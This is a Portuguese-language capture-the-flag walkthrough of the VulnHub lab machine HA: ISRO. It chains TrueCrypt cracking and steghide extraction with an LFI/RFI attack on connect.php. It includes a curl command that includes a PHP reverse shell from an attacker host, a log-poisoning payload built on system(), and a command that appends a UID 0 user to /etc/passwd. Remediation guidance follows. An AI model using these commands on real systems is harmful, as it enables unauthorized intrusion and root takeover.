# HA: ISRO — Alcançando as Estrelas, Uma Vulnerabilidade de Cada Vez

A Organização Indiana de Pesquisa Espacial (ISRO) lançou o primeiro satélite indiano Aryabhata em 1975, alcançou Marte com Mangalyaan em 2014 e pousou perto do polo sul lunar com Chandrayaan-3 em 2023. Cada missão exigiu precisão em camadas. HA: ISRO espelha essa metodologia perfeitamente: quatro flags com nomes de missões ISRO, cada uma exigindo uma técnica diferente para alcançar. Base64 em comentários HTML, cracking de volume TrueCrypt, esteganografia, LFI para RCE, MySQL sem senha e um `/etc/passwd` com permissão de escrita global. Design de máquina sensacional, mano.

| Campo | Valor |
|---|---|
| **Nível** | Intermediário |
| **VM Alvo** | HA: ISRO |
| **VM Atacante** | Kali Linux |
| **URL VulnHub** | https://www.vulnhub.com/entry/ha-isro,422/ |
| **Técnicas** | Enumeração de serviços Nmap, brute-force de diretórios web, decodificação Base64 de comentário HTML, cracking de volume TrueCrypt (john), montagem de volume VeraCrypt, extração de esteganografia com steghide, exploração de LFI (Inclusão de Arquivo Local), reverse shell PHP, estabilização de shell, acesso não autenticado root ao MySQL, injeção de root em /etc/passwd com escrita global |
| **CVEs** | CWE-98 (LFI: Controle Impróprio de Nome de Arquivo para Instrução Include/Require em PHP), CWE-521 (Requisitos de Senha Fraca: MySQL root sem senha), CWE-732 (Atribuição Incorreta de Permissão: /etc/passwd com escrita global) |
| **Grupos APT** | APT41: usa cadeias LFI para RCE na exploração de aplicações web durante fases de acesso inicial; OceanLotus (APT32): aproveita arquivos de sistema com escrita global e abuso de credenciais MySQL para escalação de privilégios em comprometimentos de servidores Linux |

---

## Resumo do Ataque

```
nmap → SSH (22), HTTP (80)
  → dirb → bhaskara.html, connect.php
  → view-source:bhaskara.html → <!-- L2JoYXNrYXJh -->
  → base64 -d → /bhaskara
  → wget http://alvo/bhaskara/ → volume TrueCrypt (bhaskara)
  → python true.py bhaskara > hashes
  → john hashes --wordlist=rockyou.txt → xavier
  → montagem VeraCrypt → aryabhata.jpg
  → FLAG 1: Bhaskara {b7bb88578a70970b9be45ac8630b6f9d}
  → steghide extract -sf aryabhata.jpg → flag.txt
  → FLAG 2: Aryabhata {e39cf1cbb00f09141259768b6d4c63fb}
  → curl connect.php?file=/etc/passwd → LFI confirmado
  → reverse shell PHP → callback nc → www-data
  → estabilização de shell (python pty + stty)
  → mysql -u root (sem senha) → use flag → select * from flag
  → FLAG 3: Mangalyaan {d8a7f803e36f1c84e277009bf2c0f435}
  → ls -la /etc/passwd → com escrita global!
  → openssl passwd → injetar usuário UID 0 → su rootme
  → FLAG 4: Chandrayaan {0ad8d59efe7ce5c820aa7350a5d708b2}
```

---

## Metodologia

1. Descoberta de rede e scan de portas
2. Enumeração de diretórios web para encontrar comentário HTML com dica Base64
3. Decodificação Base64 para descobrir e baixar o volume TrueCrypt
4. Cracking da senha do volume TrueCrypt com John the Ripper
5. Montagem VeraCrypt e extração com steghide para flags 1 e 2
6. Exploração de LFI em connect.php para reverse shell (caminho para flag 3)
7. Estabilização de shell para ferramentas interativas
8. Acesso root não autenticado ao MySQL para flag 3
9. Exploração de /etc/passwd com escrita global para root e flag 4

---

## Passo 1 — Descoberta do Host e Scan de Portas

```bash
sudo netdiscover -i eth1 -r 192.168.1.0/24
# Alvo: 192.168.1.104

nmap -A 192.168.1.104
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.x
80/tcp open  http    Apache httpd 2.4.x
```

Dois serviços. HTTP é a superfície de ataque primária. SSH é o potencial alvo de movimento lateral se credenciais forem encontradas.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Enumeração Web e Dica Base64

Executa brute-force de diretórios com extensões de arquivo:

```bash
dirb http://192.168.1.104
dirb http://192.168.1.104 -X .php
```

Descobre `bhaskara.html` e `connect.php`. Visualiza o código-fonte de `bhaskara.html`:

```html
<!-- L2JoYXNrYXJh -->
```

Uma string codificada em Base64 oculta em um comentário HTML. Decodifica:

```bash
echo "L2JoYXNrYXJh" | base64 -d
# Saída: /bhaskara
```

Navega para `http://192.168.1.104/bhaskara/`. O navegador baixa um arquivo chamado `bhaskara`: o volume TrueCrypt.

**Por que codificação de comentário HTML é ineficaz:** Comentários HTML são visíveis para qualquer usuário do navegador via "Ver Código Fonte" (Ctrl+U). A codificação Base64 não oferece confidencialidade. Este é um erro clássico do mundo real: desenvolvedores que incorporam caminhos internos, chaves de API ou informações de depuração em comentários HTML acreditando que usuários "não vão notar."

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios; T1027 — Arquivos ou Informações Ofuscadas

---

## Passo 3 — Cracking do Volume TrueCrypt e Montagem

Extrai o hash do volume TrueCrypt:

```bash
python true.py bhaskara > hashes
# true.py é um extrator de hash TrueCrypt para hashcat/john
# Também: truecrypt2john.py (do john-the-ripper jumbo)
```

Cracking do hash com John the Ripper:

```bash
john hashes --wordlist=/usr/share/wordlists/rockyou.txt
john hashes --show
# Senha: xavier
```

Monta o volume no VeraCrypt GUI (TrueCrypt está depreciado; VeraCrypt suporta volumes TrueCrypt legados):

1. Abre o VeraCrypt
2. Seleciona um slot, clica em "Selecionar Arquivo", escolhe o arquivo `bhaskara`
3. Clica em "Montar", digita a senha `xavier`
4. Volume montado, navega por ele

O volume montado contém `aryabhata.jpg`.

A Flag 1 está em um arquivo de texto dentro do volume ou como metadados: `{b7bb88578a70970b9be45ac8630b6f9d}` — **flag Bhaskara.**

**Nota do mundo real:** TrueCrypt era uma ferramenta de criptografia amplamente utilizada descontinuada em 2014 em circunstâncias misteriosas. Seu sucessor VeraCrypt adicionou melhorias de segurança e mantém compatibilidade retroativa. Dumps LSASS e volumes TrueCrypt com senhas fracas aparecem juntos em casos forenses reais: operadores APT às vezes usam volumes criptografados para armazenar ferramentas e credenciais, confiando em frases-senha fracas de wordlists.

**MITRE ATT&CK:** T1022 — Dados Criptografados; T1110.002 — Força Bruta: Cracking de Senha

---

## Passo 4 — Extração com Steghide (Flag 2)

Extrai conteúdo oculto de `aryabhata.jpg`:

```bash
steghide extract -sf aryabhata.jpg
# Digita frase-senha: (tenta em branco, depois 'xavier')
# Extrai: flag.txt
cat flag.txt
# {e39cf1cbb00f09141259768b6d4c63fb}
```

**Flag 2: Aryabhata** = `{e39cf1cbb00f09141259768b6d4c63fb}`

**O que o steghide faz:** steghide incorpora dados dentro de arquivos JPEG ou BMP modificando os bits menos significativos (LSB) dos dados da imagem. As modificações são imperceptíveis ao olho humano. A detecção requer ou saber que um arquivo contém dados ocultos (e ter a frase-senha) ou usar ferramentas de esteganálise como `stegdetect` ou `zsteg`.

**MITRE ATT&CK:** T1027 — Arquivos ou Informações Ofuscadas

---

## Passo 5 — Exploração de LFI e Reverse Shell

Testa o parâmetro `connect.php` para Inclusão de Arquivo Local:

```bash
curl "http://192.168.1.104/connect.php?file=/etc/passwd"
```

Se o conteúdo do `/etc/passwd` for retornado, LFI está confirmado. O parâmetro `file` é passado diretamente para o `include()` ou `require()` do PHP sem sanitização.

Configura o listener:

```bash
nc -lvnp 1234
```

Se `allow_url_include=On` estiver habilitado (Inclusão de Arquivo Remoto possível), hospeda um reverse shell PHP no atacante:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php /tmp/shell.php
# Edita: $ip = '192.168.1.103'; $port = 1234;
python3 -m http.server 80
```

Aciona RFI para incluir o shell remoto:

```bash
curl "http://192.168.1.104/connect.php?file=http://192.168.1.103/shell.php"
```

Netcat recebe o callback como `www-data`.

**Alternativa se apenas LFI (sem RFI):** Usa envenenamento de log. Injeta PHP no User-Agent e inclui o log de acesso:

```bash
curl -A "<?php system(\$_GET['cmd']); ?>" http://192.168.1.104/
curl "http://192.168.1.104/connect.php?file=/var/log/apache2/access.log&cmd=id"
```

**Nota do mundo real:** Vulnerabilidades LFI com `allow_url_include=On` são vulnerabilidades de Execução Remota de Código. Esta má configuração PHP foi a causa raiz de milhares de implantações de web shell. APT41 especificamente tem como alvo instalações CMS baseadas em PHP para cadeias LFI para RCE como vetores de acesso inicial. A CISA KEV inclui múltiplos CVEs de RFI PHP de plataformas CMS populares.

**MITRE ATT&CK:** T1190 — Exploração de Aplicativo Público; T1059.004 — Interpretador de Comandos: Unix Shell

---

## Passo 6 — Estabilização de Shell

Shells netcat brutas são frágeis. Estabiliza imediatamente:

```bash
# No shell da vítima:
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
export SHELL=bash

# No atacante (coloca o shell em background primeiro com Ctrl+Z):
stty raw -echo; fg
# Pressiona Enter duas vezes
```

Agora o shell suporta Ctrl+C, completamento por tab e programas interativos.

**MITRE ATT&CK:** T1059.004 — Interpretador de Comandos: Unix Shell

---

## Passo 7 — Acesso Root Não Autenticado ao MySQL (Flag 3)

Enumera serviços em execução:

```bash
netstat -antp
# MySQL na porta 3306 (localhost)
```

Conecta ao MySQL como root sem senha:

```bash
mysql -u root
```

Enumera bancos de dados:

```bash
show databases;
use flag;
show tables;
select * from flag;
# {d8a7f803e36f1c84e277009bf2c0f435}
```

**Flag 3: Mangalyaan** = `{d8a7f803e36f1c84e277009bf2c0f435}`

**Nota do mundo real:** MySQL `root` sem senha (ou senha vazia) é uma das más configurações mais consistentemente encontradas em testes de penetração Linux. Instalações MySQL padrão em muitas distribuições Linux historicamente deixavam a conta root sem senha. Isso permite que qualquer usuário com acesso shell, incluindo `www-data`, acesse todos os bancos de dados. O OWASP Top 10 A07:2021 (Falhas de Identificação e Autenticação) especificamente menciona isso.

**MITRE ATT&CK:** T1078.001 — Contas Válidas: Contas Padrão

---

## Passo 8 — Injeção Root em /etc/passwd com Escrita Global (Flag 4)

Verifica permissões de arquivo em `/etc/passwd`:

```bash
ls -la /etc/passwd
# -rw-rw-rw- 1 root root 1234 ... /etc/passwd
```

`/etc/passwd` tem permissão de escrita global. Gera um hash de senha e injeta uma nova conta UID 0:

```bash
openssl passwd -1 -salt user3 pass123
# Saída: $1$user3$rAGRVf5p2jYTqtq0W5cPu/

echo 'rootme:$1$user3$rAGRVf5p2jYTqtq0W5cPu/:0:0:root:/root:/bin/bash' >> /etc/passwd
su rootme
# Senha: pass123
id
# uid=0(root) gid=0(root) groups=0(root)
cat /root/flag4.txt
# {0ad8d59efe7ce5c820aa7350a5d708b2}
```

**Flag 4: Chandrayaan** = `{0ad8d59efe7ce5c820aa7350a5d708b2}`

**Nota do mundo real:** `/etc/passwd` com permissões de escrita para outros (`-rw-rw-rw-`) é uma má configuração crítica. O arquivo `/etc/passwd` define contas de usuário e era a localização original para hashes de senha (antes do `/etc/shadow` ser introduzido). Mesmo em sistemas modernos, uma entrada UID 0 em `/etc/passwd` cria uma conta de superusuário sem precisar de uma entrada no shadow. OceanLotus foi documentado usando `/etc/passwd` gravável para persistência em sistemas Linux comprometidos.

**MITRE ATT&CK:** T1136.001 — Criar Conta: Conta Local; T1548.001 — Abuso de Mecanismo de Controle de Elevação

---

## Flags, Hashes e Credenciais Capturados

| Tipo | Valor | Encontrado Em | Crackeado/Usado |
|---|---|---|---|
| Flag 1: Bhaskara | `{b7bb88578a70970b9be45ac8630b6f9d}` | Volume TrueCrypt (senha: xavier) | Montagem do volume |
| Flag 2: Aryabhata | `{e39cf1cbb00f09141259768b6d4c63fb}` | steghide extract de aryabhata.jpg | steghide |
| Senha TrueCrypt | xavier | john --wordlist=rockyou.txt | Montagem do volume |
| Web shell | www-data | LFI/RFI em connect.php | Acesso shell |
| Flag 3: Mangalyaan | `{d8a7f803e36f1c84e277009bf2c0f435}` | mysql -u root (sem senha): flag.flag | Root MySQL |
| Credencial root | rootme:pass123 | Injeção em /etc/passwd | su rootme |
| Flag 4: Chandrayaan | `{0ad8d59efe7ce5c820aa7350a5d708b2}` | /root/flag4.txt via conta UID 0 injetada | Root completo |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Lição Principal |
|---|---|---|---|
| 1 | Base64 em comentário HTML revela caminho sensível | Desenvolvedores incorporam caminhos internos em código do lado do cliente assumindo que usuários não verão; Base64 não oferece segurança | Auditar todo o código-fonte HTML antes da implantação; nunca ocultar caminhos ou dicas em código visível ao cliente |
| 2 | Volume TrueCrypt com senha crackeável pelo rockyou | Contêineres criptografados com senhas fracas fornecem falsa segurança; john os cracking offline sem limitação de taxa | Usar frases-senha aleatórias fortes; derivar do gerenciador de senhas; mínimo de 20 caracteres |
| 3 | LFI com allow_url_include=On habilita RCE | LFI + RFI = RCE sem exploração adicional; comum em aplicações PHP antigas | Validar e criar lista branca do parâmetro de arquivo; desabilitar allow_url_include em php.ini; usar sanitização de entrada |
| 4 | MySQL root sem senha acessível para www-data | Qualquer web shell no servidor tem acesso completo ao banco de dados; todos os dados da aplicação estão comprometidos | Definir senha forte para root MySQL; restringir root ao localhost com autenticação; executar MySQL como usuário dedicado |
| 5 | /etc/passwd com escrita global para injeção instantânea de UID 0 | Uma única linha acrescentada ao /etc/passwd cria um backdoor root permanente | `chmod 644 /etc/passwd`; implementar monitoramento de integridade de arquivo (AIDE, Tripwire); monitorar escritas em /etc/passwd |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Reconhecimento | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Acesso a Credenciais | Acesso a Credenciais | Força Bruta: Cracking de Senha | T1110.002 |
| Acesso Inicial | Acesso Inicial | Exploração de Aplicativo Público | T1190 |
| Execução | Execução | Interpretador de Comandos: Unix Shell | T1059.004 |
| Acesso a Credenciais | Acesso a Credenciais | Contas Válidas: Contas Padrão | T1078.001 |
| Escalação de Privilégios | Escalação de Privilégios | Abuso de Mecanismo de Controle de Elevação | T1548.001 |
| Persistência | Persistência | Criar Conta: Conta Local | T1136.001 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Remover dicas Base64 do código-fonte HTML**: auditar todo HTML/JS/CSS antes da implantação para strings codificadas; usar varredura SAST automatizada em CI/CD
2. **Impor frases-senha fortes para TrueCrypt/VeraCrypt**: mínimo de 20 caracteres aleatórios; usar gerenciador de senhas para gerar e armazenar
3. **Desabilitar LFI e RFI no PHP**: `allow_url_include=Off` em php.ini; validar parâmetros `file` contra uma lista branca estrita; rejeitar qualquer tentativa de traversal de caminho
4. **Proteger conta root MySQL**: `ALTER USER 'root'@'localhost' IDENTIFIED BY 'SenhaForte';`; restringir ao localhost; executar MySQL como usuário `mysql`, não root
5. **Corrigir permissões do /etc/passwd**: `chmod 644 /etc/passwd`; implementar monitoramento de integridade de arquivo com AIDE ou Tripwire em arquivos do sistema
6. **Desabilitar Inclusão de Arquivo Remoto PHP**: `allow_url_include=Off`; `allow_url_fopen=Off` onde não for necessário; aplicar regras WAF na camada de aplicação

### Contramedidas MITRE D3FEND

- **D3-ACH** — Hardening de Configuração de Aplicativo (desabilitar allow_url_include; proteger MySQL)
- **D3-FIM** — Monitoramento de Integridade de Arquivo (monitorar escritas em /etc/passwd)
- **D3-OAM** — Gerenciamento Administrativo do SO (corrigir permissões de arquivo)

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gerenciamento de Ativos | Inventariar aplicações PHP; auditar permissões de arquivo; catalogar contas de banco de dados |
| Proteger | Segurança de Dados | Remover dicas sensíveis do código-fonte web; corrigir permissões do /etc/passwd; proteger MySQL |
| Proteger | Controle de Acesso | Desabilitar LFI/RFI no PHP; exigir autenticação MySQL |
| Detectar | Anomalias e Eventos | Alertar sobre modificações em /etc/passwd; monitorar login root MySQL de processos web |
| Responder | Planejamento de Resposta | Remover entradas injetadas em /etc/passwd; rotacionar todas as credenciais; desabilitar vetores LFI |
| Recuperar | Planejamento de Recuperação | Restaurar /etc/passwd do backup; reconstruir aplicação PHP com configuração segura |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-3 | Imposição de Acesso | Corrigir permissões /etc/passwd; restringir acesso root MySQL |
| AC-6 | Menor Privilégio | MySQL roda como usuário mysql, não root; sem MySQL root sem senha |
| CM-6 | Configurações | Desabilitar allow_url_include; impor configuração PHP segura |
| CM-7 | Funcionalidade Mínima | Remover informações de depuração do código-fonte HTML; desabilitar RFI |
| SC-28 | Proteção de Informações em Repouso | Volumes criptografados exigem frases-senha fortes |
| SI-2 | Remediação de Falhas | Corrigir aplicações PHP para vulnerabilidades LFI; atualizar MySQL |

### CISA KEV

Padrões PHP LFI para RCE (CWE-98) aparecem em múltiplos avisos CISA incluindo AA21-008A e a cadeia de exploração com tema ISRO mapeia para técnicas no Alerta CISA AA22-074A cobrindo exploração de aplicações web para acesso inicial. A má configuração do MySQL sem senha é diretamente abordada na lista de Vulnerabilidades Rotineiramente Exploradas da CISA (falhas de gerenciamento de credenciais).

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gerenciamento de Identidade e Acesso (IAM) | Gerenciar Privilégios e Contas | MIL3 |
| Gerenciamento de Ameaças e Vulnerabilidades (THREAT) | Realizar Avaliações de Vulnerabilidade | MIL2 |
| Gerenciamento de Ativos, Mudanças e Configuração (ASSET) | Gerenciar Configuração de Ativos de TI | MIL3 |

---

## Considerações Finais

HA: ISRO faz jus ao nome. Assim como as missões da ISRO exigiram diferentes soluções de engenharia para cada objetivo (lançamento, órbita, inserção em Marte, pouso lunar), esta máquina exige um conjunto de ferramentas e mentalidade completamente diferente para cada uma de suas quatro flags. Esteganografia, cracking TrueCrypt, exploração LFI, abuso MySQL, injeção passwd: você toca cada camada da pilha.

Os quatro nomes de missão como nomes de flags (Bhaskara, Aryabhata, Mangalyaan, Chandrayaan) são uma homenagem genuinamente inteligente. Cada flag capturada parece uma inserção orbital. Máquina top demais, véi.

Thanks guys!! (❍ᴥ❍ʋ)
